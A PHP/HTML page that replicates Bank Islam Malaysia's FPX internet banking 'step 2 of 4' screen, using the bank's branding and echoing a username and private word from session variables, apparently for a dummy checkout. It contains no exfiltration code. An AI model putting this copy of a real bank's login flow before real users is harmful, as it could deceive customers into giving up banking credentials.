<?php
session_start();
$_SESSION['ID'];
$_SESSION['dum_word'];
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>FPX Payment Gateway</title>
    <!-- plugins:css -->
    <link rel="stylesheet" href="first/vendors/mdi/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="first/vendors/flag-icon-css/css/flag-icon.min.css">
    <link rel="stylesheet" href="first/vendors/css/vendor.bundle.base.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <!-- endinject -->
    <!-- Plugin css for this page -->
    <!-- End plugin css for this page -->
    <!-- inject:css -->
    <!-- endinject -->
    <!-- Layout styles -->
    <link rel="stylesheet" href="first/css/style.css">
    <!-- End layout styles -->
    <link rel="shortcut icon" href="first/images/fpx.jpg" />
  </head>
  <style>
    .content-wrapper{
  background-color: white;
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
  padding-top: 0px;
}
  </style>

  <body>
    <div class="container-scroller">
      <div class="container-fluid page-body-wrapper full-page-wrapper">
        <div class="content-wrapper d-flex align-items-center auth" >
          <div class="row flex-grow">
            <div class="col-lg-4 mx-auto" >
                <img style="width: 60%" src="first/images/bankislam.png" alt="">
                <img class="float-end" style="width: 30%" src="first/images/fpx.jpg" alt="">
                <p class="float-end"  style="color: black;"><b>FPX Step (2 of 4)</b></p><br><br>
            
              <div class="auth-form-light text-left p-3" style="background-color:#b0093d">
                <div class="brand-logo">
                </div>
                <center><p style="color: white; font-family: arial; font-size: 12px;" >Welcome to Bank Islam Internet Banking </p></center>
                <center><p style="color: white; font-family: arial; font-size: 12px;" >Peace be upon you, <?php echo $_SESSION ['dum_username'] ?> </p></center>
                <center><img style="width: 30%" src="assets/images/watermelon1.png" alt=""></center></br>
                <center><p style="color: white; font-family: arial; font-size: 12px;" >Private Word: <?php echo $_SESSION ['dum_word'] ?> </p></center>
                <center><p style="color: white; font-family: arial; font-size: 11px;" >Is this your Private Image and Private Word?</p></center>
                <center><a class="btn btn-secondary" type="button" href="payment3.php">Yes</a>
                <a class="btn btn-secondary" type="button" href="payment.php?ID=<?php echo $_SESSION['ID']; ?>">No</a><br></center></br>
                <center><p style="color: white; font-family: arial; font-size: 11px;" >If this is not the chosen Private Image and Private Word, do not login, Please call
            Bank Islam Contact Center at 603-26 900 900</p><br></center>
                   
                           


                 
                        </div>
                        <div class="auth-form-light text-left p-3" style="background-color:#582625">
                            <p class="text-center" style="color:white; font-size: 12px">Bank Islam Malaysia Berhad (98127-X). All right reserved.</p>
                            <p class="text-center" style="color:white; font-size: 12px">The webpage is best viewed using IE 7.0 and above, Chrome 33.0 and
                                    above, Mozilla Firefox 26.0 and above, Safari 5.1.6 and above.</p>
                        </div>
                     <!--fade end -->
                                

              </div>
            </div>
          </div>
        </div>
        <!-- content-wrapper ends -->
      </div>
      <!-- page-body-wrapper ends -->
    </div>
    <!-- container-scroller -->
    <!-- plugins:js -->
    <script src="assets/vendors/js/vendor.bundle.base.js"></script>
    <!-- endinject -->
    <!-- Plugin js for this page -->
    <!-- End plugin js for this page -->
    <!-- inject:js -->
    <script src="assets/js/off-canvas.js"></script>
    <script src="assets/js/hoverable-collapse.js"></script>
    <script src="assets/js/misc.js"></script>
    <!-- endinject -->
  </body>
</html>